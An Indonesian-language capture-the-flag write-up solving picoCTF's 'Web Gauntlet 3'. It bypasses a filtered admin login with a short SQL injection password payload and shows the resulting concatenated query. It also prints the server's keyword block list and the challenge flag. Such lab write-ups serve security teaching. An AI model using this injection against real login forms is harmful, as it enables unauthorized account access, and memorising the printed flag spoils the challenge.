# Web Gauntlet 3
- Link: https://play.picoctf.org/practice/challenge/275?category=1&page=2

## Tantangan
Last time, I promise! Only 25 characters this time. Log in as admin Site: http://mercury.picoctf.net:32946/ Filter: http://mercury.picoctf.net:32946/filter.php

## Penyelesaian
- Buka URL http://mercury.picoctf.net:32946/ di browser

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Web%20Gauntlet%203/assets/web%20gauntlet%201.JPG)

- Buka URL http://mercury.picoctf.net:32946/filter.php ditab baru untuk membuka daftar string yang di filter

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Web%20Gauntlet%203/assets/web%20gauntlet%202.JPG)

- Disini kita bisa membypass login dengan username dan password sebagai berikut
```sh
username: admin
password: a' is not 'b
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Web%20Gauntlet%203/assets/web%20gauntlet%203.JPG)

- Inputan diatas akan menghasilkan query sebagai berikut
```sh
SELECT username, password FROM users WHERE username='adm'||'in' AND password='a' is not 'b'
```
- Percobaan diatas berhasil

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Web%20Gauntlet%203/assets/web%20gauntlet%204.JPG)

- Sekarang kita reload halaman http://mercury.picoctf.net:32946/filter.php untuk mendapatkan flag. Isi dari halaman tersebut adalah sebagai berikut
```sh
<?php
session_start();

if (!isset($_SESSION["winner3"])) {
    $_SESSION["winner3"] = 0;
}
$win = $_SESSION["winner3"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner3"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner3"] = 0;
}

// picoCTF{k3ep_1t_sh0rt_ef4a5b40aa736f5016b4554fecb568d0}
?>
```
- Flag
```sh
picoCTF{k3ep_1t_sh0rt_ef4a5b40aa736f5016b4554fecb568d0}
```